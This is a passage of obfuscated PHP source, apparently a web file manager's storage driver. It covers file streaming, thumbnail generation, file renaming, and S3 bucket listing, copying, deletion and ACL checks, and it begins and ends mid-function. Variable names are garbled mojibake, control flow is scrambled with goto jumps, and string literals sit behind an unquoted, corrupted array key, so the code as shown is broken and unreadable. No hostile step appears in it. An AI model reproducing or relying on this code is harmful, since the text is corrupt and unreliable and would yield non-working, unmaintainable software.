B©Øæ‚∏—Ú: $cƒﬂ±«Ûî‡ =& $_SERVER[∞„˜ƒÑºª]; if (!$cıŸæ√Ω’ô || !$this->exist($cıŸæ√Ω’ô)) { show_json(LNG($cƒﬂ±«Ûî‡[107]), !1, $EÉ„ﬂ¨ÕΩî); } @ob_end_clean(); goto Cúà§§´Ç≠; a‡ú≈â≤˘ò: while ($D∑Çç˜É© <= $e©£…åìù¢) { $C£¬™ñ»Ï˘ = $e©£…åìù¢ - $D∑Çç˜É© + 1; if ($C£¬™ñ»Ï˘ <= $Aé»Ÿö’«‡) { $Aé»Ÿö’«‡ = $C£¬™ñ»Ï˘; } echo $this->fileSubstr($cıŸæ√Ω’ô, $D∑Çç˜É©, $Aé»Ÿö’«‡); $D∑Çç˜É© += $Aé»Ÿö’«‡; if ($Aé»Ÿö’«‡ == $C£¬™ñ»Ï˘) { $D∑Çç˜É© = $e©£…åìù¢ + 1; } if ($dùïƒ“†œ) { usleep($F≥ÁÊä∏Ïﬁ); } } goto cØ∏Ñ‚ﬁåú; f“ï»±œ»ä: $Aé»Ÿö’«‡ = 1024 * 100; $F≥ÁÊä∏Ïﬁ = 0; if ($dùïƒ“†œ) { $F≥ÁÊä∏Ïﬁ = 1000 * 1000 / 100; } goto a‡ú≈â≤˘ò; Cúà§§´Ç≠: set_timeout(); $aõçˆÃèÑô = $this->infoFull($cıŸæ√Ω’ô); $CÜ‹ÉÕ˘áç = $aõçˆÃèÑô[$cƒﬂ±«Ûî‡[86]]; goto CãﬁªŒäÕÔ; CÛ›«°ÒîÜ: $dùïƒ“†œ = $GLOBALS[$cƒﬂ±«Ûî‡[6]][$cƒﬂ±«Ûî‡[92]][$cƒﬂ±«Ûî‡[134]][$cƒﬂ±«Ûî‡[136]] * 1024 * 1024; $Cï•≈∑ÇÔ» = strtolower($_SERVER[$cƒﬂ±«Ûî‡[137]]); if ($cøÏã‚Úó && $Cï•≈∑ÇÔ» && $f—˜∆Ì¯£≥) { if (strstr($Cï•≈∑ÇÔ», $cƒﬂ±«Ûî‡[138])) { header($cƒﬂ±«Ûî‡[139] . $cıŸæ√Ω’ô); } else { if (strstr($Cï•≈∑ÇÔ», $cƒﬂ±«Ûî‡[140])) { header($cƒﬂ±«Ûî‡[141] . $cıŸæ√Ω’ô); } else { if (strstr($Cï•≈∑ÇÔ», $cƒﬂ±«Ûî‡[142])) { header($cƒﬂ±«Ûî‡[143] . $cıŸæ√Ω’ô); } } } if ($dùïƒ“†œ) { header($cƒﬂ±«Ûî‡[144] . $dùïƒ“†œ); } return; } goto eäí§ﬁöåÖ; cØ∏Ñ‚ﬁåú: } public function fileOutServer($D∫ÍÎ¿›Û•, $AåıÃ≠Ç”Ú = false, $eä±ûÁ®Çæ = false, $C’ §˜◊·› = '') { self::fileOut($D∫ÍÎ¿›Û•, $AåıÃ≠Ç”Ú, $eä±ûÁ®Çæ, $C’ §˜◊·›); } public function fileOutLink($Eåè∫ó¯ßá) { $A›õ¬Àıá≤ =& $_SERVER[∞„˜ƒÑºª]; if (substr($Eåè∫ó¯ßá, 0, 7) == $A›õ¬Àıá≤[152]) { $Eåè∫ó¯ßá = $A›õ¬Àıá≤[153] . substr($Eåè∫ó¯ßá, 7); } header($A›õ¬Àıá≤[154] . $Eåè∫ó¯ßá); die; } public function fileOutImage($a⁄ˆßã√îí, $Aé√âé˘Ωè = 250) { goto f¡§ÓÔæ¢¯; EôÈçêê•: $dîûô¯·Ω≥ = DATA_THUMB . $dÃéö‰Òƒ⁄; if (!@file_exists($dîûô¯·Ω≥)) { $fÜ≤Êú†ƒ– = TEMP_FILES; if (!is_dir($fÜ≤Êú†ƒ–)) { mk_dir($fÜ≤Êú†ƒ–); } $D¡º‡Ì¯…≤ = $fÜ≤Êú†ƒ– . $f¡ê¶‰çúè . $f™¥á©·Óë[98] . $C•ë¨ˆ∞π∑[$f™¥á©·Óë[156]]; if (!@file_exists($D¡º‡Ì¯…≤)) { $D¡º‡Ì¯…≤ = $this->download($a⁄ˆßã√îí, $D¡º‡Ì¯…≤); } $aôÜìÚ·‘ä = new ImageThumb($D¡º‡Ì¯…≤, $f™¥á©·Óë[163]); $aôÜìÚ·‘ä->prorate($dîûô¯·Ω≥, $Aé√âé˘Ωè, $Aé√âé˘Ωè); } if (!file_exists($dîûô¯·Ω≥) || filesize($dîûô¯·Ω≥) < 100) { return $this->fileOut($a⁄ˆßã√îí); } goto a…èóÎ—†™; a…èóÎ—†™: if (!($Fâ‘ëÚÇ‚ì = IO::move($dîûô¯·Ω≥, $Cëë‚“äöÌ))) { return IO::fileOut($dîûô¯·Ω≥); } del_file($dîûô¯·Ω≥); IO::fileOut($Fâ‘ëÚÇ‚ì); goto b≈Ñ¶—∑ãá; dÚóã©”Öœ: if (!($bÒ≠£è‰† = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $f™¥á©·Óë[161]))) { $Cëë‚“äöÌ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $f™¥á©·Óë[162]); } else { $Cëë‚“äöÌ = KodIO::make($bÒ≠£è‰†); } if ($bÒ≠£è‰† = IO::fileNameExist($Cëë‚“äöÌ, $dÃéö‰Òƒ⁄)) { $dîûô¯·Ω≥ = KodIO::make($bÒ≠£è‰†); return IO::fileOut($dîûô¯·Ω≥); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto EôÈçêê•; Bçå‹ÜÎÕŒ: if ($C•ë¨ˆ∞π∑[$f™¥á©·Óë[86]] <= 1024 * 50 || !function_exists($f™¥á©·Óë[155]) || $C•ë¨ˆ∞π∑[$f™¥á©·Óë[156]] == $f™¥á©·Óë[157]) { return $this->fileOut($a⁄ˆßã√îí); } if (isset($C•ë¨ˆ∞π∑[$f™¥á©·Óë[158]][$f™¥á©·Óë[159]])) { $f¡ê¶‰çúè = $C•ë¨ˆ∞π∑[$f™¥á©·Óë[158]][$f™¥á©·Óë[159]]; } else { if (isset($C•ë¨ˆ∞π∑[$f™¥á©·Óë[158]][$f™¥á©·Óë[160]])) { $f¡ê¶‰çúè = $C•ë¨ˆ∞π∑[$f™¥á©·Óë[158]][$f™¥á©·Óë[160]]; } else { $f¡ê¶‰çúè = md5("{$C•ë¨ˆ∞π∑[$f™¥á©·Óë[28]]}\x5f{$C•ë¨ˆ∞π∑[$f™¥á©·Óë[84]]}\137{$C•ë¨ˆ∞π∑[$f™¥á©·Óë[86]]}"); } } $dÃéö‰Òƒ⁄ = "{$f¡ê¶‰çúè}\x5f{$Aé√âé˘Ωè}\x2e\160\x6e\x67"; goto dÚóã©”Öœ; f¡§ÓÔæ¢¯: $f™¥á©·Óë =& $_SERVER[∞„˜ƒÑºª]; if (substr($a⁄ˆßã√îí, 0, 4) == $f™¥á©·Óë[142]) { $this->fileOutLink($a⁄ˆßã√îí); } $C•ë¨ˆ∞π∑ = $this->info($a⁄ˆßã√îí); goto Bçå‹ÜÎÕŒ; b≈Ñ¶—∑ãá: } public function fileOutImageServer($c‘Øá« ˘, $Aç÷é√±É = 250) { self::fileOutImage($c‘Øá« ˘, $Aç÷é√±É); } public function fileNameAuto($fŒâÉˆ¶∂à, $E°”Üáä≤∫, $B∞∫Ñ¯—±Ò = REPEAT_RENAME, $fÌﬁ†ÒˆçÔ = false) { goto e‚Ûı›ÖŒä; e‚Ûı›ÖŒä: $d¢ãÓÎãà« =& $_SERVER[∞„˜ƒÑºª]; $c™ﬂâòéÕ˘ = $fŒâÉˆ¶∂à === $d¢ãÓÎãà«[33] ? $E°”Üáä≤∫ : rtrim($fŒâÉˆ¶∂à, $d¢ãÓÎãà«[8]) . $d¢ãÓÎãà«[8] . $E°”Üáä≤∫; if ($B∞∫Ñ¯—±Ò == REPEAT_REPLACE || !$this->exist($c™ﬂâòéÕ˘) || $fÌﬁ†ÒˆçÔ && $B∞∫Ñ¯—±Ò != REPEAT_RENAME_FOLDER) { return $E°”Üáä≤∫; } goto B’‰◊å«ﬁè; AÂ‚°‘÷à: while ($this->exist(rtrim($fŒâÉˆ¶∂à, $d¢ãÓÎãà«[8]) . $d¢ãÓÎãà«[8] . $c¡à’ﬂ·≤»)) { $c¡à’ﬂ·≤» = $b∑–∑ë«Û∏ . "\x28{$E¶É£ªÃÑπ}\x29{$c±√¨Ω¿Ï¶}"; $E¶É£ªÃÑπ++; } return $c¡à’ﬂ·≤»; goto Dä±·óÆ§œ; B’‰◊å«ﬁè: if ($B∞∫Ñ¯—±Ò == REPEAT_SKIP) { return !1; } $c±√¨Ω¿Ï¶ = $d¢ãÓÎãà«[98] . get_path_ext($E°”Üáä≤∫); $c±√¨Ω¿Ï¶ = $c±√¨Ω¿Ï¶ == $d¢ãÓÎãà«[98] || $fÌﬁ†ÒˆçÔ ? $d¢ãÓÎãà«[33] : $c±√¨Ω¿Ï¶; goto aÃêè¢ÿÁò; aÃêè¢ÿÁò: $E¶É£ªÃÑπ = 1; $b∑–∑ë«Û∏ = substr($E°”Üáä≤∫, 0, strlen($E°”Üáä≤∫) - strlen($c±√¨Ω¿Ï¶)); $c¡à’ﬂ·≤» = $b∑–∑ë«Û∏ . "\50{$E¶É£ªÃÑπ}\x29{$c±√¨Ω¿Ï¶}"; goto AÂ‚°‘÷à; Dä±·óÆ§œ: } public function listAllFiles($B⁄çÿÖ®É—, $B«òåáÿë•, $Dµã¥ºı‚™ = array()) { goto b‘âµÑÔ‚ç; DÙ∫¿Ú∆•˜: foreach (array_unique($B Ëó⁄ÕÖÇ) as $Bæﬁ¢áª©Ç) { $F§åòÇ„Ç‘ = array($Eé‡ëƒﬂﬂæ[84] => $this->getPathOuter($Eé‡ëƒﬂﬂæ[8] . $B⁄çÿÖ®É— . $Eé‡ëƒﬂﬂæ[8] . $Bæﬁ¢áª©Ç), $Eé‡ëƒﬂﬂæ[85] => 1, $Eé‡ëƒﬂﬂæ[86] => 0); if (substr($Bæﬁ¢áª©Ç, -1) != $Eé‡ëƒﬂﬂæ[8]) { $F§åòÇ„Ç‘[$Eé‡ëƒﬂﬂæ[85]] = 0; $c‹ŸéçÀ£ù = $this->getPath($B⁄çÿÖ®É— . $Eé‡ëƒﬂﬂæ[8] . $Bæﬁ¢áª©Ç); $F§åòÇ„Ç‘[$Eé‡ëƒﬂﬂæ[86]] = isset($Dµã¥ºı‚™[$c‹ŸéçÀ£ù]) ? $Dµã¥ºı‚™[$c‹ŸéçÀ£ù] : $this->size($c‹ŸéçÀ£ù); } $c¬⁄àµ®ìﬂ[] = $F§åòÇ„Ç‘; } return $c¬⁄àµ®ìﬂ; goto d©»Õ“ëÀˆ; b‘âµÑÔ‚ç: $Eé‡ëƒﬂﬂæ =& $_SERVER[∞„˜ƒÑºª]; if (empty($B«òåáÿë•)) { return array(); } $B Ëó⁄ÕÖÇ = array(); goto Dä®Ö≠ºáâ; Dä®Ö≠ºáâ: $B⁄çÿÖ®É— = trim($B⁄çÿÖ®É—, $Eé‡ëƒﬂﬂæ[8]); foreach ($B«òåáÿë• as $Bæﬁ¢áª©Ç) { $fú≤â∆ëË• = ltrim(substr($Bæﬁ¢áª©Ç, strlen($B⁄çÿÖ®É—)), $Eé‡ëƒﬂﬂæ[8]); $B Ëó⁄ÕÖÇ = array_merge($B Ëó⁄ÕÖÇ, $this->slicePath($fú≤â∆ëË•)); } $c¬⁄àµ®ìﬂ = array(); goto DÙ∫¿Ú∆•˜; d©»Õ“ëÀˆ: } public function slicePath($Eõ°ëå∞îë) { $dÑÿ¯åΩ°ˆ =& $_SERVER[∞„˜ƒÑºª]; $AÌÜ∆ÁŸç∂ = explode($dÑÿ¯åΩ°ˆ[8], trim($Eõ°ëå∞îë, $dÑÿ¯åΩ°ˆ[8])); $Då»˜èΩ»◊ = 0; do { ++$Då»˜èΩ»◊; $cñß›≥ø§[] = implode($dÑÿ¯åΩ°ˆ[8], array_slice($AÌÜ∆ÁŸç∂, 0, $Då»˜èΩ»◊)) . $dÑÿ¯åΩ°ˆ[8]; } while ($Då»˜èΩ»◊ < count($AÌÜ∆ÁŸç∂)); $cñß›≥ø§[count($AÌÜ∆ÁŸç∂) - 1] = $Eõ°ëå∞îë; return $cñß›≥ø§; } public function getHost($f≠ú®¨÷≠´ = true) { $fı¡¢‚¶õõ =& $_SERVER[∞„˜ƒÑºª]; $B±ÙÍÈƒä = parse_url(trim($this->domain, $fı¡¢‚¶õõ[8])); $AáïŸô›ı¶ = isset($B±ÙÍÈƒä[$fı¡¢‚¶õõ[164]]) ? $B±ÙÍÈƒä[$fı¡¢‚¶õõ[164]] : http_type(); $CòôÃäº§Œ = isset($B±ÙÍÈƒä[$fı¡¢‚¶õõ[165]]) ? $B±ÙÍÈƒä[$fı¡¢‚¶õõ[165]] : $B±ÙÍÈƒä[$fı¡¢‚¶õõ[84]]; if (isset($B±ÙÍÈƒä[$fı¡¢‚¶õõ[166]])) { $CòôÃäº§Œ .= $fı¡¢‚¶õõ[4] . $B±ÙÍÈƒä[$fı¡¢‚¶õõ[166]]; } return $AáïŸô›ı¶ . $fı¡¢‚¶õõ[167] . $CòôÃäº§Œ . ($f≠ú®¨÷≠´ ? $fı¡¢‚¶õõ[8] . $this->bucket : $fı¡¢‚¶õõ[33]); } public function pathEncode($e≈∫∏Æêï√) { $E∏ÿ§Æç®· =& $_SERVER[∞„˜ƒÑºª]; return str_replace($E∏ÿ§Æç®·[168], $E∏ÿ§Æç®·[8], rawurlencode($e≈∫∏Æêï√)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public function __construct($e≤ñæå¡‡“) { set_timeout(); require_once SDK_DIR . $_SERVER[∞„˜ƒÑºª][169]; parent::__construct(); $this->_init($e≤ñæå¡‡“); } public function _init($Eπ´Ö∑ıÉÈ) { foreach ($Eπ´Ö∑ıÉÈ as $f¿⁄•œÊç‹ => $B∫àæ◊Øî‰) { if (isset($this->{$f¿⁄•œÊç‹})) { $this->{$f¿⁄•œÊç‹} = $B∫àæ◊Øî‰; } } $this->endpoint = $Eπ´Ö∑ıÉÈ[$_SERVER[∞„˜ƒÑºª][170]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost(!1)); } public function signatureVersion($d∆µËõ£·ı = "\166\x34") { $this->signVer = $d∆µËõ£·ı; $this->client->setSignatureVersion($d∆µËõ£·ı); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Cõﬁéê≥¥Ω; Cí»ÌëëÑ∏: $c‹íπâñ·Û = array($b∫é–íÿ∏Î[176], $b∫é–íÿ∏Î[177], $b∫é–íÿ∏Î[178], $b∫é–íÿ∏Î[179], $b∫é–íÿ∏Î[180]); $F°ÉâÿÇˆ“ = array_diff($c‹íπâñ·Û, $câ‰©ΩçÀû); return empty($F°ÉâÿÇˆ“); goto a“Ü÷◊⁄ê≈; CÖÜæÙÓ·Â: if ($fΩÿ¶åê¨°[$b∫é–íÿ∏Î[171]] != $b∫é–íÿ∏Î[172] || $fΩÿ¶åê¨°[$b∫é–íÿ∏Î[173]] != $b∫é–íÿ∏Î[172]) { return !1; } $câ‰©ΩçÀû = array_map($b∫é–íÿ∏Î[174], $fΩÿ¶åê¨°[$b∫é–íÿ∏Î[175]]); if (!is_array($câ‰©ΩçÀû)) { $câ‰©ΩçÀû = array(); } goto Cí»ÌëëÑ∏; Cõﬁéê≥¥Ω: $b∫é–íÿ∏Î =& $_SERVER[∞„˜ƒÑºª]; $fΩÿ¶åê¨° = $this->getBucketCors(); if (!$fΩÿ¶åê¨° || !is_array($fΩÿ¶åê¨°)) { return !1; } goto CÖÜæÙÓ·Â; a“Ü÷◊⁄ê≈: } public function mkfile($BŸ—∑≠•ùá, $aô·ªﬂ¡∆ü = '', $BÇ÷¢û∏∏‘ = REPEAT_RENAME) { $d¿ê∞‚äŒƒ = $this->setContent($BŸ—∑≠•ùá, $aô·ªﬂ¡∆ü); if ($d¿ê∞‚äŒƒ !== !1) { return $this->getPathOuter($BŸ—∑≠•ùá); } return !1; } public function mkdir($C¢ﬁáâ•»›, $D—éã‹ß“ú = REPEAT_SKIP) { if (empty($C¢ﬁáâ•»›)) { return !1; } if ($this->isFolder($C¢ﬁáâ•»›)) { return $this->getPathOuter($C¢ﬁáâ•»›); } $e¥É⁄≈åΩ« = $this->setContent($C¢ﬁáâ•»›, $_SERVER[∞„˜ƒÑºª][33], !0); if ($e¥É⁄≈åΩ« !== !1) { return $this->getPathOuter($C¢ﬁáâ•»›); } return !1; } public function copyFile($Dâåëë”®Ã, $b’ﬁ¨≠ΩøÚ, $fŒ‰√œïéÂ = array()) { $fó˘ ö”°” =& $_SERVER[∞„˜ƒÑºª]; $a®≈Éèîç– = $this->getObjectInfo($Dâåëë”®Ã); if (!$a®≈Éèîç–) { return !1; } if ($a®≈Éèîç–[$fó˘ ö”°”[86]] <= 1024 * 1024 * 200) { return $this->client->copyObject($this->bucket, $Dâåëë”®Ã, $this->bucket, $b’ﬁ¨≠ΩøÚ, $fó˘ ö”°”[181], $fŒ‰√œïéÂ); } return $this->client->multiCopyObject($this->bucket, $Dâåëë”®Ã, $this->bucket, $b’ﬁ¨≠ΩøÚ, $fŒ‰√œïéÂ); } public function moveFile($f’ªö©ïŒÛ, $bÇí§ÓåŒñ) { if ($this->copyFile($f’ªö©ïŒÛ, $bÇí§ÓåŒñ)) { $this->delFile($f’ªö©ïŒÛ); return !0; } return !1; } public function delFile($c€ÁÜÊÁﬂù) { return $this->client->deleteObject($this->bucket, $c€ÁÜÊÁﬂù); } public function delFolder($b•ŒØ†±Ü) { goto d√¢‡Ú…†»; F¢†Ò’å–: return $AÚŒâŸõªÇ === $f¯á“ë◊‡Ò ? !0 : !1; goto Eã∏ÒÚ∆¯”; cﬂÇ®È∞ß≠: $AÚŒâŸõªÇ = $f¯á“ë◊‡Ò = 0; $düÆí¬‡≥û = array_chunk(array_keys($fçµêç“Áè), 1000); foreach ($düÆí¬‡≥û as $A¡ıÇÜ•àÀ) { $AÚŒâŸõªÇ++; $f¯á“ë◊‡Ò += (int) $this->client->deleteObjects($this->bucket, $A¡ıÇÜ•àÀ); } goto F¢†Ò’å–; d√¢‡Ú…†»: $aÙí§ﬁπÇ¬ =& $_SERVER[∞„˜ƒÑºª]; $fçµêç“Áè = $this->listObjs($b•ŒØ†±Ü); if (!$fçµêç“Áè) { $b•ŒØ†±Ü = trim($b•ŒØ†±Ü, $aÙí§ﬁπÇ¬[8]); if (!empty($b•ŒØ†±Ü)) { $b•ŒØ†±Ü .= $aÙí§ﬁπÇ¬[8]; } return $this->delFile($b•ŒØ†±Ü); } goto cﬂÇ®È∞ß≠; Eã∏ÒÚ∆¯”: } public function rename($cäî˘ò©Óå, $fïâ∫¢ûêˆ) { return $this->renameObject($cäî˘ò©Óå, $fïâ∫¢ûêˆ); } public function size($Fπ„±©˘éè) { $D¶≤©Ÿ¥≈· =& $_SERVER[∞„˜ƒÑºª]; $C‹Ê˘‘î•Û = $this->info($Fπ„±©˘éè); return isset($C‹Ê˘‘î•Û[$D¶≤©Ÿ¥≈·[86]]) ? $C‹Ê˘‘î•Û[$D¶≤©Ÿ¥≈·[86]] : 0; } public function info($Fõ‘÷”˜Êí) { if ($this->isFolder($Fõ‘÷”˜Êí)) { return $this->folderInfo($Fõ‘÷”˜Êí, 1); } return $this->fileInfo($Fõ‘÷”˜Êí); } public function exist($D‚ΩÛ∂ºêß) { if ($this->isFile($D‚ΩÛ∂ºêß)) { return !0; } return $this->isFolder($D‚ΩÛ∂ºêß); } public function isFile($A€ªÉ·®±˘) { return $this->client->getObjectInfo($this->bucket, trim($A€ªÉ·®±˘, $_SERVER[∞„˜ƒÑºª][8]), !1); } public function isFolder($bÚé√Œ†À˜) { $fË≠å‹ƒ„ = $this->listObjs($bÚé√Œ†À˜, null, 1); return !empty($fË≠å‹ƒ„) ? !0 : !1; } public function listPath($CÂò©ÖË¢£, $d„©‡›äïó = false, $aú–ôâéÌ = false) { $FƒÃøÉﬁ”„ =& $_SERVER[∞„˜ƒÑºª]; $aÖú©≥∫îÿ = $this->listObjs($CÂò©ÖË¢£, null, null, $FƒÃøÉﬁ”„[8]); $b„’Æì‚ã≠ = array($FƒÃøÉﬁ”„[83] => array(), $FƒÃøÉﬁ”„[82] => array()); foreach ($aÖú©≥∫îÿ as $c´À—Ù’àÛ => $E‡∏ÇÇ⁄ﬂ“) { if ($c´À—Ù’àÛ == $FƒÃøÉﬁ”„[8]) { continue; } if (isset($E‡∏ÇÇ⁄ﬂ“[$FƒÃøÉﬁ”„[182]])) { $b„’Æì‚ã≠[$FƒÃøÉﬁ”„[83]][] = $this->folderInfo($E‡∏ÇÇ⁄ﬂ“[$FƒÃøÉﬁ”„[182]], $d„©‡›äïó, $aú–ôâéÌ); } else { if (substr($E‡∏ÇÇ⁄ﬂ“[$FƒÃøÉﬁ”„[28]], -1) == $FƒÃøÉﬁ”„[8]) { continue; } $b„’Æì‚ã≠[$FƒÃøÉﬁ”„[82]][] = $this->fileInfo($E‡∏ÇÇ⁄ﬂ“[$FƒÃøÉﬁ”„[28]], $E‡∏ÇÇ⁄ﬂ“, $aú–ôâéÌ); } } return $b„’Æì‚ã≠; } private function fileInfo($aπÇääÙà¨, $AÛ’¢ÆﬁÑ… = array(), $då‘œ√∂á’ = false) { goto C™Êè—áØ≥; Bàº√ÖÉÎá: if (empty($AÛ’¢ÆﬁÑ…)) { $AÛ’¢ÆﬁÑ… = $this->getObjectInfo($aπÇääÙà¨); if (!$AÛ’¢ÆﬁÑ…) { return $aïá∫ŸêÖ®; } $this->fileInfoImage($aπÇääÙà¨, $aïá∫ŸêÖ®); } $aïá∫ŸêÖ®[$E»è—ßÁí‰[109]] = $AÛ’¢ÆﬁÑ…[$E»è—ßÁí‰[186]]; $aïá∫ŸêÖ®[$E»è—ßÁí‰[86]] = $AÛ’¢ÆﬁÑ…[$E»è—ßÁí‰[86]]; goto EÁªÓè≈òˆ; EÁªÓè≈òˆ: return $aïá∫ŸêÖ®; goto C†ûÓ° Æ‡; C™Êè—áØ≥: $E»è—ßÁí‰ =& $_SERVER[∞„˜ƒÑºª]; if ($då‘œ√∂á’) { return array($E»è—ßÁí‰[28] => $this->pathThis($aπÇääÙà¨), $E»è—ßÁí‰[84] => $this->getPathOuter($aπÇääÙà¨), $E»è—ßÁí‰[29] => $E»è—ßÁí‰[163], $E»è—ßÁí‰[156] => $this->ext($aπÇääÙà¨), $E»è—ßÁí‰[86] => isset($AÛ’¢ÆﬁÑ…[$E»è—ßÁí‰[86]]) ? $AÛ’¢ÆﬁÑ…[$E»è—ßÁí‰[86]] : 0); } $aïá∫ŸêÖ® = array($E»è—ßÁí‰[28] => $this->pathThis($aπÇääÙà¨), $E»è—ßÁí‰[84] => $this->getPathOuter($aπÇääÙà¨), $E»è—ßÁí‰[29] => $E»è—ßÁí‰[163], $E»è—ßÁí‰[183] => $E»è—ßÁí‰[50], $E»è—ßÁí‰[109] => $E»è—ßÁí‰[50], $E»è—ßÁí‰[86] => 0, $E»è—ßÁí‰[156] => $this->ext($aπÇääÙà¨), $E»è—ßÁí‰[184] => !0, $E»è—ßÁí‰[185] => !0); goto Bàº√ÖÉÎá; C†ûÓ° Æ‡: } private function folderInfo($cœØÿíÆØÕ, $B¿ãœô√§Ï = 0, $bı„ÑıÏ√ı = false) { goto Bïé÷Ω÷Û–; f…‚– öûÇ: return $A´«œÉˆ◊Ü; goto aÇ≤◊ùıﬁæ; Bïé÷Ω÷Û–: $Eƒ∑¢ıÖ‹∂ =& $_SERVER[∞„˜ƒÑºª]; if ($bı„ÑıÏ√ı) { return array($Eƒ∑¢ıÖ‹∂[28] => $this->pathThis($cœØÿíÆØÕ), $Eƒ∑¢ıÖ‹∂[84] => $this->getPathOuter($Eƒ∑¢ıÖ‹∂[8] . $cœØÿíÆØÕ), $Eƒ∑¢ıÖ‹∂[29] => $Eƒ∑¢ıÖ‹∂[85]); } $A´«œÉˆ◊Ü = array($Eƒ∑¢ıÖ‹∂[28] => $this->pathThis($cœØÿíÆØÕ), $Eƒ∑¢ıÖ‹∂[84] => $this->getPathOuter($Eƒ∑¢ıÖ‹∂[8] . $cœØÿíÆØÕ), $Eƒ∑¢ıÖ‹∂[29] => $Eƒ∑¢ıÖ‹∂[85], $Eƒ∑¢ıÖ‹∂[183] => $Eƒ∑¢ıÖ‹∂[50], $Eƒ∑¢ıÖ‹∂[109] => $Eƒ∑¢ıÖ‹∂[50], $Eƒ∑¢ıÖ‹∂[187] => !1, $Eƒ∑¢ıÖ‹∂[188] => !1, $Eƒ∑¢ıÖ‹∂[184] => !0, $Eƒ∑¢ıÖ‹∂[185] => !0); goto E”º‡êâì‘; eÖ“πêôÇÊ: $A´«œÉˆ◊Ü[$Eƒ∑¢ıÖ‹∂[183]] = $bÙõ Âã±Œ[$Eƒ∑¢ıÖ‹∂[186]]; $A´«œÉˆ◊Ü[$Eƒ∑¢ıÖ‹∂[109]] = $bÙõ Âã±Œ[$Eƒ∑¢ıÖ‹∂[186]]; if ($B¿ãœô√§Ï) { $A´«œÉˆ◊Ü[$Eƒ∑¢ıÖ‹∂[187]] = $this->has($cœØÿíÆØÕ, !1); $A´«œÉˆ◊Ü[$Eƒ∑¢ıÖ‹∂[188]] = $this->has($cœØÿíÆØÕ, !0); } goto f…‚– öûÇ; E”º‡êâì‘: if ($cœØÿíÆØÕ == $Eƒ∑¢ıÖ‹∂[33]) { return $A´«œÉˆ◊Ü; } $bÙõ Âã±Œ = $this->getObjectInfo(trim($cœØÿíÆØÕ, $Eƒ∑¢ıÖ‹∂[8]) . $Eƒ∑¢ıÖ‹∂[8]); if (!$bÙõ Âã±Œ) { return $A´«œÉˆ◊Ü; } goto eÖ“πêôÇÊ; aÇ≤◊ùıﬁæ: } public function listObjs($e†Â¬∞æÒó, $d™ƒ≈Ë¬Ë‹ = null, $AÖ±ãÏÇö˜ = null, $d”ëºæÜÃÈ = null) { $DÏê≈∞Ë‰Æ =& $_SERVER[∞„˜ƒÑºª]; $e†Â¬∞æÒó = trim($e†Â¬∞æÒó, $DÏê≈∞Ë‰Æ[8]); $cÆ‹√«Ìﬁë = empty($e†Â¬∞æÒó) ? $DÏê≈∞Ë‰Æ[33] : $e†Â¬∞æÒó . $DÏê≈∞Ë‰Æ[8]; return $this->client->getBucket($this->bucket, $cÆ‹√«Ìﬁë, $d™ƒ≈Ë¬Ë‹, $AÖ±ãÏÇö˜, $d”ëºæÜÃÈ, !0); } public function has($Bó±ßØëØÉ, $bëÇîîçı° = true) { $B∑ê§∫ã˘Ë =& $_SERVER[∞„˜ƒÑºª]; $D„¨ÛÕá” = null; $bÕçÔÏëÍË = 20; $b∞¿®Œæ¥® = $B∑ê§∫ã˘Ë[8]; while (!0) { $dı≠ÎÁ›éî = $this->listObjs($Bó±ßØëØÉ, $D„¨ÛÕá”, $bÕçÔÏëÍË, $b∞¿®Œæ¥®); if (!$dı≠ÎÁ›éî) { return !1; } end($dı≠ÎÁ›éî); $D„¨ÛÕá” = key($dı≠ÎÁ›éî); if ($bëÇîîçı°) { foreach ($dı≠ÎÁ›éî as $cßÔæ≈€Æ¶) { if (isset($cßÔæ≈€Æ¶[$B∑ê§∫ã˘Ë[28]]) && substr($cßÔæ≈€Æ¶[$B∑ê§∫ã˘Ë[28]], -1) != $B∑ê§∫ã˘Ë[8]) { return !0; } } } else { foreach ($dı≠ÎÁ›éî as $cßÔæ≈€Æ¶) { if (isset($cßÔæ≈€Æ¶[$B∑ê§∫ã˘Ë[182]])) { return !0; } } } if (count($dı≠ÎÁ›éî) < $bÕçÔÏëÍË || !$D„¨ÛÕá”) { break; } } return !1; } public function listAll($E—ﬁÇ‹Æπ◊) { $cŒ∞Ã∆ Ó® =& $_SERVER[∞„˜ƒÑºª]; $CÚù˘É∑πë = $this->listObjs($E—ﬁÇ‹Æπ◊); $DèÊëæ«ëÕ = $A€ôïÆ¿“¯ = array(); foreach ($CÚù˘É∑πë as $c≈è“ÓªæÏ => $e∫∂ÿèöÕ¥) { $DèÊëæ«ëÕ[] = $e∫∂ÿèöÕ¥[$cŒ∞Ã∆ Ó®[28]]; $A€ôïÆ¿“¯[$c≈è“ÓªæÏ] = $e∫∂ÿèöÕ¥[$cŒ∞Ã∆ Ó®[86]]; } return $this->listAllFiles($E—ﬁÇ‹Æπ◊, $DèÊëæ«ëÕ, $A€ôïÆ¿“¯); } public function canRead($c‘É¯òœûá) { $eÕÿœÂäÛä =& $_SERVER[∞„˜ƒÑºª]; $aïáñ’≠√» = $this->client->getAccessControlPolicy($this->bucket, $c‘É¯òœûá); if (!$aïáñ’≠√») { return !1; } return in_array($aïáñ’≠√», array($eÕÿœÂäÛä[189], $eÕÿœÂäÛä[190], $eÕÿœÂäÛä[191])) ? !0 : !1; } public function canWrite($F∏àÑÆÑÊÏ) { $e¯÷õ‚”ÍÕ =& $_SERVER[∞„˜ƒÑºª]; $aâß÷∞Ç∫ë = $this->client->getAccessControlPolicy($this->bucket, $F∏àÑÆÑÊÏ); if (!$aâß÷∞Ç∫ë) { return !1; } return in_array($aâß÷∞Ç∫ë, array($e¯÷õ‚”ÍÕ[189], $e¯÷õ‚”ÍÕ[190])) ? !0 : !1; } public function getContent($AÁ™î∏è∫ä) { return $this->client->getObject($this->bucket, $AÁ™î∏è∫ä); } public function setContent($e»ëΩÊ≈î¿, $dä‹‹Êæú· = '', $cÀÁ˘∑©À÷ = false) { goto fÕó¬˜ÌáÈ; AÚÌòÜ’Çá: $bÜº ®ƒ‹à = 